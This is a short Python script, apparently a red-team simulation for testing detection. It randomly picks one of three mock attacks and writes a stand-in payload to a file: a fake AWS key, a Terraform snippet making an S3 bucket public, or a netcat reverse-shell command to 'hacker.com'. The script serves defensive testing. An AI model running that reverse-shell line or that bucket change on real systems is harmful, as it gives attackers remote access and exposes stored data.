import random

def simulate_sophisticated_attack():
    print("[RED-TEAM] Initializing Adversarial Simulation...")
    strategies = [
        "EXFILTRATION: Attempting to bypass Vault and find raw AKIA keys.",
        "EXPOSURE: Attempting to modify Terraform to create a Public S3 bucket.",
        "PERSISTENCE: Attempting to hide a backdoor in the application logic."
    ]
    
    # The AI chooses a random attack vector
    target = random.choice(strategies)
    print(f"[ATTACK] Selected Vector: {target}")

    # SIMULATION: The 'Hacker' tries to write a bad file
    with open("malicious_attempt.txt", "w") as f:
        if "EXFILTRATION" in target:
            f.write("HACKER_FOUND_SECRET = 'AKIA_BAD_KEY_LEAK'")
        elif "EXPOSURE" in target:
            f.write("resource 'aws_s3_bucket' 'leak' { public = true }")
        else:
            f.write("import os; os.system('nc -e /bin/sh hacker.com 4444')")

    print("[RED-TEAM] Attack payload delivered. Waiting for detection...")

if __name__ == "__main__":
    simulate_sophisticated_attack()